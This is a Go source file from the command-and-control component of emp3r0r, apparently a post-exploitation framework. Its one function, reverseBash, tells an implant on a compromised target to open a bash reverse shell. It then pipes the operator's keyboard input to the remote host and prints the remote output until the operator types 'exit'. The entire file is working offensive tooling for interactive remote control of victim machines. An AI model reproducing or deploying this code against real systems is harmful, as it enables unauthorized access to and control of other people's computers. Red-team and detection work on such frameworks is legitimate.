package cc

import (
	"log"
	"os"
	"strings"

	"github.com/jm33-m0/emp3r0r/emagent/internal/agent"
)

func reverseBash() {
	// activate reverse shell in agent
	err := SendCmd("bash", CurrentTarget)
	if err != nil {
		CliPrintError("Cannot activate reverse shell on remote target: ", err)
		return
	}

	go func() {
		for incoming := range RecvAgentBuf {
			os.Stdout.Write(incoming)
		}
	}()

	go func() {
		// send to target
		for outgoing := range SendAgentBuf {
			_, err = agent.CCStream.Write(outgoing)
			if err != nil {
				log.Print("Send to remote: ", err)
			}
		}
	}()
	for {
		// read stdin
		buf := make([]byte, agent.BufSize)
		_, err = os.Stdin.Read(buf)
		if err != nil {
			CliPrintWarning("Bash: %v", err)
		}
		SendAgentBuf <- buf
		if strings.HasPrefix(string(buf), "exit\n") {
			break
		}
	}

	_ = agent.CCStream.Close()
	CliPrintWarning("bash reverse shell exited")
}
